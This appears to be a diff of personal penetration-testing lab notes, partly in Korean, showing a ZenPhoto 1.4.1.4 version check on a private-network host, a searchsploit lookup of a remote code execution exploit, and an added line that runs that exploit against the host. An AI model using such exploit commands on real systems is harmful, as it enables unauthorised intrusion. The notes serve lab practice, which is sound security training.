@@ -313,7 +313,7 @@ http://192.168.207.41/test 개발자 도구 하단 zenphoto version 1.4.1.4
 # cve
 searchsploit zenphoto 
 ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                         | php/webapps/18083.php
-
+php 18083.php 192.168.207.41 /test/
 
 ```
 ### Nukem
